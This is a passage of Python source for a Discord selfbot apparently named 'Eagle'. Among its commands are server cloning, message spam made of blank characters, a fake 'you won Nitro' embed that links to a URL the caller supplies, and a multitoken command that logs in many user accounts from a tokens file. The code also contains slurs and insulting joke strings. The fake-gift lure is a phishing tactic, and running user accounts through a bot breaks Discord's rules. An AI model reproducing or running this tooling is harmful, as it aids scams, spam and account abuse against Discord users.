        res = r.json()
        await ctx.send(res['data'][0]['url'])


@Eagle.command(aliases=['porncomment', 'HOLYSHITSTOPKIDDINGSTUPIDRETARD'])
async def phcomment(ctx, user: str=None, *, args=None):
    endmylife = 'https://nekobot.xyz/api/imagegen?type=phcomment&text=' + args + '&username=' + user + '&image=' + str(ctx.author.avatar_url_as(format='png'))
    depression = requests.get(endmylife)
    sad = depression.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(sad['message']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as (file):
            await ctx.send(file=(discord.File(file, 'eaglehubLOL.png')))
    except:
        await ctx.send(sad['message'])


@Eagle.command()
async def cs(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    ptsd = await Eagle.create_guild(ctx.message.guild.name)
    for channel in ptsd.channels:
        await channel.delete()

    for emoji in guild.emojis:
        if emoji.animated == True:
            r = requests.get(f"https://cdn.discordapp.com/emojis/{emoji.id}.gif", headers={'user-agent': 'Mozilla/5.0'})
            if r.status_code == 200:
                await ptsd.create_custom_emoji(name=(emoji.name), image=(r.content))
            else:
                r = requests.get(f"https://cdn.discordapp.com/emojis/{emoji.id}.png", headers={'user-agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    await ptsd.create_custom_emoji(name=(emoji.name), image=(r.content))

    for role in reversed(ptsd.roles):
        name = role.name
        permissions = role.permissions
        color = role.color
        newrole = await ptsd.create_role(name=name, color=color, permissions=permissions)

    for channel in guild.channels:
        name = channel.name
        position = channel.position
        category = str(channel.category)
        channeltype = str(channel.type)
        if channeltype == 'category':
            newchannel = await ptsd.create_category(name=name)

    for channel in guild.channels:
        name = channel.name
        position = channel.position
        categoryname = str(channel.category)
        category = discord.utils.get((ptsd.categories), name=categoryname)
        channeltype = str(channel.type)
        if channeltype == 'text':
            newchannel = await ptsd.create_text_channel(name=name, position=position, category=category)
        if channeltype == 'voice':
            newchannel = await ptsd.create_voice_channel(name=name, position=position, category=category)
        if channeltype == 'news':
            newchannel = await ptsd.create_text_channel(name=name, position=position, category=category)
            print(Fore.YELLOW + 'Command Used | clone server')


@Eagle.command()
async def realnitro(ctx, server):
    await ctx.message.delete()
    code = ''.join(random.choices((string.ascii_letters + string.digits), k=16))
    nitro = f"https://discord.gift/{code}"
    embed = discord.Embed(description='        ')
    embed.add_field(name='GG poor boy aou won Nitro', value=f"[{nitro}]({server})")
    embed.set_image(url='https://cdn.discordapp.com/attachments/827008716263522314/830714076480798780/a9ng95vvs8c41.png')
    await ctx.send(embed=embed, delete_after=30)


@Eagle.command()
async def whois(ctx, *, user: discord.Member=None):
    if user is None:
        user = ctx.author
    date_format = '%a, %d %b %Y %I:%M %p'
    em = discord.Embed(description=(user.mention))
    em.set_author(name=(str(user)), icon_url=(user.avatar_url))
    em.set_thumbnail(url=(user.avatar_url))
    em.add_field(name='Joined', value=(user.joined_at.strftime(date_format)))
    members = sorted((ctx.guild.members), key=(lambda m: m.joined_at))
    em.add_field(name='Join position', value=(str(members.index(user) + 1)))
    em.add_field(name='Registered', value=(user.created_at.strftime(date_format)))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name=('Roles [{}]'.format(len(user.roles) - 1)), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace('_', ' ').title() for p in user.guild_permissions if p[1]])
    em.add_field(name='Guild permissions', value=perm_string, inline=False)
    em.set_footer(text=('ID: ' + str(user.id)))
    return await ctx.send(embed=em)


@Eagle.command()
async def blank(ctx):
    await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nﾠﾠ')
    time.sleep('4')


@Eagle.command()
async def blankspam(ctx):
    await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nﾠsﾠ')
    time.sleep(1)
    await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nﾠs')
    time.sleep(2)
    await ctx.send('ﾠﾠ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsﾠ')


@Eagle.command()
async def dadjoke(ctx):
    funnihumor = ['Error: Your Fatherless', 'Error: You dont have a dad lol', 'Error: Your a fucking retard',
     'Error: Your dad left you', 'Error: Father is nonexistent']
    await ctx.send(random.choice(funnihumor))


@Eagle.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
    if len('**`' + r + '**`') > 2000:
        await ctx.send('Way to big wtf')
        return
    await ctx.send(f"```{r}```")
    print(Fore.YELLOW + 'Command Used | ascii')


@Eagle.command()
async def reverse(ctx, *, message):
    message = message[::-1]
    await ctx.send(message)


print('\n\n\n\n\n')

@Eagle.command()
async def multitoken(ctx):
    with open('tokens.txt') as (file):
        lines = file.readlines()
        await Login().start(lines, bot=False)


Init()
